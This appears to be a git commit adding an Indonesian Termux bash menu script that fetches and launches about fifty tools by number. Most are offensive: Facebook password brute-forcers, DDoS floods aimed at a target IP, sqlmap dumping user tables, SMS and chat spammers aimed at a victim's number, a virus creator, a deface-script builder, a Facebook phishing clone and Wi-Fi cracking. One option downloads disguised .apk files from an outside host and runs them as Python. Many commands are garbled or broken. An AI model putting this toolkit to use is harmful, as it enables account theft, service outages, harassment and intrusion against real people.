4f888a627d6c5f50dbe3a1e6c86877f98c967c17
0MEST <40414350+0M3STG4NT3N6@users.noreply.github.com>
2018-11-03 15:12:38 +0700

    Add files via upload

---
+++ v1.sh
@@ -0,0 +1,860 @@
+#!/system/xbin/bash
+#ngoding pake otak bro bukan pake kontol!1!1
+#jadi jan recode dan hargailah karya orang dikit :)
+#tool gabungan work :::>> bukan tool install default
+clear
+
+figlet WELCOME |lolcat -a -d 30
+sleep 1
+toilet -f mono12 -F gay bastard
+sleep 1
+toilet -f mono12 -F metal Use Your Brain
+sleep 1
+toilet -f slant --gay  Dont Use Your Dick
+sleep 1
+
+
+echo _______________________________ |lolcat
+echo author : 0MEST |lolcat
+echo _______________________________ |lolcat
+echo program : bash |lolcat
+echo _______________________________ |lolcat
+echo version : v.1 |lolcat
+echo _______________________________ |lolcat
+echo type : tool gabungan |lolcat
+echo _______________________________ |lolcat
+echo team  : Termux-Tools-ID |lolcat
+echo _______________________________ |lolcat
+echo thanks : Mr.Tr3v!0n-HUN7312 |lolcat
+echo          M.Daffa-Patrick |lolcat
+echo          Mr.Viver-Chemod |lolcat
+echo          MicroClone-ZoRROkiN |lolcat
+echo ________________________________ |lolcat
+
+echo -e "\033[33;1m -CONTACT ME- "
+echo -e "\033[31;1m Fb : 0h Oh Hekel ll"
+echo -e "\033[31;1m Wa : 0822-7881-8357"
+echo -e "\033[37;1m Tm : 0x3a"
+echo -e "\033[37;1m Em : omest98@yahoo.com"
+
+echo WAIT CONNECTING FOR LIST TOOL |lolcat -a -d 150
+
+
+
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [1]  fbbrute-1                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [2]  fbbrute-2                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [3]  fbbrute-3                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [4]  fbbrute-4                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [5]  fbbrute-5 by me          !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [6]  hammer                   !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [7]  xerxes                   !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [8]  torshammer               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [9]  LITEDDOS                 !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [10] hunner                   !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [11] Sql-Map                  !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [12] viSQL                    !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [13] Sql-Mate                 !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [14] Admin Panel Finder       !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [15] Hakku Framework          !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [16] Red_Hawk                 !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [17] D-TECT                   !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [18] acunetyx-project         !"
+echo -e "\033[30;1m ::::::::::::::::::::::::::::::!"
+echo -e "\033[35;1m [19] B4J1N64N-2               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [20] B4J1N64N-5               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [21] B4J1N64N-6               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [22] IP-FINDIP                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [23] Ip Geolocation           !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [24] Ip Recon_Dog             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [25] SpamChat                 !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [26] Spammer-Grab             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [27] SpamSms                  !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [28] Santet-Online            !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [29] Create Script Deface     !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [30] Create Virus             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [31] Phising Weeman           !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [32] Kontoolin                !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [33] hack instagram           !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [34] bot-komen-fb             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [35] Hash Buster              !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [36] Green-Reaper             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [37] wifi-hacker              !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [38] KickThemout              !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [39] APAFI                    !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [40] OSIF                     !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [41] Tul Hekel by me          !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [42] Info Website             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [43] moon-buggy               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[32;1m [44] musikan via termux       !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[33;1m [45] browsing via termux      !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[34;1m [46] telepon via termux       !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[35;1m [47] kereta api               !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[36;1m [48] neofetch                 !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m [49] figlet ASCII             !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[31;1m [50] Youtube Via Termux       !"
+echo -e "\033[30;1m :::::::::::::::::::::::::::::::"
+echo -e "\033[37;1m {99} KELUAR---->"
+
+echo -e "\033[34;1m CHOSE:"
+
+read mrrm
+
+if [ $mrrm = 1 ] || [ $mrrm = 1 ]
+then
+clear
+apt update 
+apt upgrade
+apt install python2s
+apt install python2-dev
+apt install wget
+pip2 install mechanize
+cd /storage/emulated/0
+ls
+python2 fbbrute.py
+storage/emulated/0/password.txt
+fi
+
+if [ $mrrm = 2 ] || [ $mrrm = 2 ]
+then
+clear
+apt update
+apt upgrade
+apt install python2
+apt install wget
+pip2 install mechanize
+cd /sdcard
+mkdir facebrute
+cd facebrute
+wget http://override.waper.co/files/
+facebook.apk
+wget http://override.waper.co/files/
+password.apk
+mv facebook.apk facebook.py
+mv password.apk password.txt
+python2 facebook.py
+fi
+
+if [ $mrrm = 3 ] || [ $mrrm = 3 ]
+then
+clear
+apt update
+apt upgrade
+apt install python2
+ pip2 install urllib3 chardet certifi idna requests
+apt install openssl curl
+Pkg install libcurl
+Ln -s/sdcard
+cd sdcard
+python2 fb.py
+fi
+
+if [ $mrrm = 4 ] || [ $mrrm = 4 ]
+then
+clear
+apt update
+apt upgrade
+apt install python
+apt install pip
+pip install wordlist
+apt install wordlist
+wordlist -h
+cd /sdcard
+Cat pas.txt
+fi
+
+if [ $mrrm = 5 ] || [ $mrrm = 5 ]
+then
+clear
+git clone https://github.com/0M3STG4NT3N6/cracking.git
+cd cracking
+ls
+python2 FBcrack.py
+fi
+
+if [ $mrrm = 6 ] || [ $mrrm = 6 ]
+then
+clear
+pkg update
+pkg upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+python hammer.py -s [IP target] -p [port] -t 135
+fi
+
+if [ $mrrm = 7 ] || [ $mrrm = 7 ]
+then
+clear
+apt install git
+apt install clang
+ git clone https://github.com/zanyarjamal/xerxes
+ls
+cd xerxes
+ls
+clang xerxes.c -o xerxes
+ls
+./xerxes
+fi
+
+if [ $mrrm = 8 ] || [ $mrrm = 8 ]
+then
+clear
+pkg update
+pkg install git
+apt install tor
+pkg install python2
+git clone https://github.com/dotfighter/torshammer.git
+cd torshammer
+ls
+python2 torshammer.py
+fi
+
+if [ $mrrm = 9 ] || [ $mrrm = 9 ]
+then
+clear
+apt update
+apt upgrade
+pkg install git
+pkg install python2
+git clone https://github.com/4L13199/LITEDDOS
+cd LITEDDOS
+python2 liteDDOS.py
+fi
+
+if [ $mrrm = 10 ] || [ $mrrm = 10 ]
+then
+clear
+apt update
+
+apt install python
+
+apt install git -y
+
+git clone https://github.com/b3-v3r/Hunner
+
+cd Hunner
+
+chmod 777 hunner.py
+python hunner.py
+fi
+
+if [$mrrm = 11 ] || [ $mrrm = 11 ]
+then
+clear
+apt update
+
+apt install python
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/sqlmapproject/sqlmap
+
+cd sqlmap
+
+Python2 sqlmap.py
+
+Python2 sqlmap.py -u website –dbs
+
+-D acuart –tables
+
+-D acuart -T users –columns
+
+-D acuart -T users -C name,email,phone -dump
+fi
+
+if [ $mrrm = 12 ] || [ $mrrm = 12 ]
+then
+clear
+apt update
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/blackvkng/viSQL
+
+cd viSQL
+
+python2 -m pip install -r requirements.txt
+python2 viSQL.py
+python2 viSQL.py -t http://www.bible-history.com
+fi
+
+if [ $mrrm = 13 ] || [ $mrrm = 13 ]
+then
+clear
+git clone https://github.com/UltimateHackers/sqlmate
+cd sqlmate
+ls
+chmod 777 sqlmate
+ls
+./sqlmate
+fi
+
+if [ $mrrm = 14 ] || [ $mrrm = 14 ]
+then
+clear
+pkg install git
+
+git clone https://github.com/Techzindia/admin_penal
+
+cd admin_penal
+
+chmod +x * admin_panel_finder.py
+python2 admin_panel_finder.py
+fi
+
+if [ $mrrm = 15 ] || [ $mrrm = 15 ]
+then
+clear
+apt install python
+
+apt install git
+
+mkdir vasu
+
+git clone https://github.com/4shadoww/hakkuframework
+
+cd hakkuframework
+
+chmod +x hakku
+
+python hakku
+
+show modules
+
+use whois
+
+show options
+
+set target examplesite.com
+run
+fi
+
+if [ $mrrm = 16 ] || [ $mrrm = 16]
+then
+clear
+apt update
+
+apt install git
+
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+
+cd RED_HAWK
+
+chmod +x rhawk.php
+apt install php
+ls
+
+php rhawk.php
+fi
+
+if [ $mrrm = 17 ] || [ $mrrm = 17 ]
+then
+clear
+apt update
+
+apt install git
+
+git clone https://github.com/shawarkhanethicalhacker/D-TECT
+
+cd D-TECT
+
+apt install python2
+
+chmod +x d-tect.py
+python2 d-tect.py
+examplesite.com
+fi
+
+if [ $mrrm = 18 ] || [ $mrrm = 18 ]
+then
+clear
+pkg install git
+pkg install python2
+git clone https://github.com/rezkynnn/acunetix-
+project.git
+cd acunetix-project
+python2 acunetix.py
+fi
+
+if [ $mrrm = 19 ] || [ $mrrm = 19 ]
+then
+clear
+pkg install python2
+
+pkg install php
+
+pkg install figlet
+
+pkg install toilet
+
+pip2 install requests
+
+pkg install git
+
+pip2 install termcolor
+
+git clone https://github.com/DarknessCyberTeam/T00Ls-B4J1N64N2
+
+cd
+
+cd T00Ls-B4J1N64N2
+
+sh B4J1N64N.sh
+fi
+
+if [ $mrrm = 20 ] || [ $mrrm = 20 ]
+then
+clear
+pkg install update
+
+pkg install git
+
+pkg install toilet
+
+pkg install figlet
+
+pip2 install lolcat
+
+git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
+
+cd B4J1N64Nv5
+sh B4J1N64N.sh
+fi
+
+if [ $mrrm = 21 ] || [ $mrrm = 21 ]
+then
+clear
+apt install update
+
+apt install upgrade
+
+pip2 install termcolor
+
+pip2 install lolcat
+
+apt install toilet
+
+apt install git
+
+git clone https://github.com/DarknessCyberTeam/BAJINGANv6
+
+cd BAJINGANv6
+
+sh BAJINGAN.sh
+
+username : BAJINGAN
+Password  : Gans
+fi
+
+if [ $mrrm = 22 ] || [ $mrrm = 22 ]
+then
+clear
+apt isntall git
+git clone https://github.com/kereh/Findip.git
+cd Findip
+ls
+pip2 install requests
+ls
+python2 findip.py
+fi
+
+if [ $mrrm = 23 ] || [ $mrrm = 23 ]
+then
+clear
+apt install python git
+
+git clone https://github.com/maldevel/IPGeoLocation.git
+
+cd IPGeoLocation
+
+chmod +x ipgeoLocation.py
+pip install -r requirements.txt
+python ipgeolocation.py -m
+
+python ipgeolocation.py -t http://www.google.com
+fi
+
+if [ $mrrm = 24 ] || [ $mrrm = 24 ]
+then
+clear
+apt update
+
+apt install python python2
+
+apt install git
+
+git clone https://github.com/UltimateHackers/ReconDog
+
+cd ReconDog
+ls
+
+chmod +x dog.py
+Python2 dog.py
+fi
+
+if [ $mrrm = 25 ] || [ $mrrm = 25 ]
+then
+clear
+pkg update && pkg upgrade
+pkg install git
+pkg install python2
+pip2 install tqdm
+pip2 install fbchat
+pip2 install mechanize
+git clone https://github.com/Senitopeng/Spamchat.git.
+cd Spamchat
+python2 messenger.py
+fi
+
+if [ $mrrm = 26 ] || [ $mrrm = 26 ]
+then
+clear
+pkg install python2
+pip2 install requests
+pkg install git
+git clone http://github.com/p4kl0nc4t/Spammer-Grab
+cd Spammer-Grab
+python2 spammer.py nomor hp korban --delay 30
+fi
+
+if [ $mrrm = 27 ] || [ $mrrm = 27 ]
+then
+clear
+apt install python2 php
+pip2 install requests
+apt install nano
+apt install git
+git clone https://github.com/Senitopeng/
+pamSms.git
+cd SpamSms
+python2 mantan.py
+fi
+
+if [ $mrrm = 28 ] || [ $mrrm = 28 ]
+then
+clear
+git clone https://github.com/Gameye98/santet-online.git
+cd santet-online
+ls
+python2 santet.py
+fi
+
+if [ $mrrm = 29 ] || [ $mrrm = 29 ]
+then
+clear
+apt update
+apt upgrade
+apt install git
+apt install python2
+git clone https://github.com/Ubaii/script-deface-creator
+ls
+cd script-deface-creator
+ls
+chmod +x create.py
+ls
+python2 create.py
+fi
+
+if [ $mrrm = 30 ] || [ $mrrm = 30 ]
+then
+clear
+apt update && apt upgrade
+
+apt install python2
+
+gem install lolcat
+
+apt install figlet
+
+apt install git
+git clone https://github.com/viruz09/CreaterVirus.git
+pip2 install mechanize
+cd CreaterVirus
+python2 creater.py
+fi
+
+if [ $mrrm = 31 ] || [ $mrrm = 31 ]
+then
+clear
+apt-get update
+apt-get upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/evait-security/weeman.git
+ls
+cd weeman
+ls
+python2 weeman.py
+show
+set url https://www.facebook.
+com
+set action_url https://www.facebook.com
+show
+fi
+
+if [ $mrrm = 32 ] || [ $mrrm = 32 ]
+then
+clear
+pkg install git
+pkg install python2
+pkg install gnupg
+pkg install nano
+git clone https://github.com/LionSec/katoolin.git
+cd  katoolin
+nano katoolin.py
+python2 katoolin.py
+fi
+
+if [ $mrrm = 33 ] || [ $mrrm = 33 ]
+then
+clear
+apt update && apt upgrade -y
+apt install nodejs git
+cd Instagram-Private-Tools
+node index.js
+git clone https://github.com/
+ccocot/Instagram-Private-Tools.git
+ npm install
+fi
+
+if [ $mrrm = 34 ] || [ $mrrm = 34 ]
+then
+clear
+pkg update && pkg upgrade
+pkg install git
+pkg install python2
+pip2 install mechanize
+git clone https://github.com/Senitopeng/
+Botkomena.git
+cd Botkomena
+python2 botkomena.py
+fi
+
+if [ $mrrm = 35 ] || [ $mrrm = 35 ]
+then
+clear
+apt update
+
+apt upgrade
+
+apt install python2
+
+apt install git
+
+git clone https://github.com/UltimateHackers/Hash-Buster
+
+cd Hash-Buster
+
+python2 hash.py
+fi
+
+if [ $mrrm = 36 ] || [ $mrrm = 36 ]
+then
+clear
+apt upgrade
+apt update
+apt install git
+apt install python2
+git clone https://github.com/Amriez/GreenReaper
+cd GreenReaper
+python2 greenreaper.py
+fi
+
+if [ $mrrm = 37 ] || [ $mrrm = 37 ]
+then
+clear
+apt update
+apt upgrade
+pkg install git
+git clone https://github.com/esc0rtd3w/wifi-hacker
+ls
+cd wifi-hacker
+ls
+ chmod +x wifi-hacker.sh
+ ls
+ ./wifi-hacker.sh
+fi
+
+if [ $mrrm = 38 ] || [ $mrrm = 38 ]
+then
+clear
+pkg update && pkg upgrade autoconfautomake bison bzip2 clang cmake\coreutils diffutils 
+flex gawk git grep gzip
+libtool make pacth perl\ sed silversearcher-ag tar wget
+
+pkg install git python2 nmap
+
+git clone https://github/
+k4m4/kickthemout.git
+
+pip2 install -r requiments.txt
+
+pip2 install netafaces
+
+pkg install python python2-dev
+
+sudo python kickthemout.py
+fi
+
+if [ $mrrm = 39 ] || [ $mrrm = 39 ]
+then
+clear
+apt update
+apt upgrade
+git clone https://github.com/Gameye98/APAFI
+cd APAFI
+chmod +x apafi.py
+python2 apafi.py
+fi
+
+if [ $mrrm = 40 ] || [ $mrrm = 40 ]
+then
+clear
+git clone https://github.com;Ciku370/OSIF.git
+cd OSIF
+ls
+python2 osif.py
+fi
+
+if [ $mrrm = 41 ] || [ $mrrm = 41 ]
+then
+clear
+git clone https://github.com/0M3STG4NT3N6/Tul-Hekel.git
+cd Newbie-Tools
+ls
+sh Newbie-Tools.sh
+fi
+
+if [ $mrrm = 42 ] || [ $mrrm = 42 ]
+then
+clear
+git clone https://github.com/0M3STG4NT3N6/Info-Website.git
+cd Info-Website
+ls
+sh info-site.sh
+fi
+
+if [ $mrrm = 43 ] || [ $mrrm = 43 ]
+then
+clear
+pkg install moon-buggy
+moon-buggy
+fi
+
+if [ $mrrm = 44 ] || [ $mrrm = 44 ]
+then
+clear
+pkg install mpv
+mpv/sdcard/lagu.mp3
+/sdcard/ bisa di ganti sesuai letak musik
+fi
+
+if [ $mrrm = 45 ] || [ $mrrm = 45 ]
+then
+clear
+pkg install w3m
+w3m www.google.com
+Linknya bsa diubah
+fi
+
+if [ $mrrm = 46 ] || [ $mrrm = 46 ]
+then
+clear
+pkg install termux-api
+ termux-telephony-call nomornya
+fi
+
+if [ $mrrm = 47 ] || [ $mrrm = 47 ]
+then
+clear
+pkg install sl
+sl
+fi
+
+if [ $mrrm = 48 ] || [ $mrrm = 48 ]
+then
+clear
+pkg install neofetch
+neofetch
+fi
+
+if [ $mrrm = 49 ] || [ $mrrm = 49 ]
+then
+clear
+pkg install figlet
+ figlet Jemb00D
+fi
+
+if [ $mrrm = 50 ] || [ $mrrm = 50 ]
+then
+clear
+pip install mps_youtube
+pip install youtube_dl
+apt install mpv
+mpsyt
+/judul lagu
+Tinggal pilih lagu dgn mengetik nomornya
+fi
+
+if [ $mrrm = 99 ] || [ $mrrm = 99]
+then
+clear
+CTRL+C
+fi
+
+exit
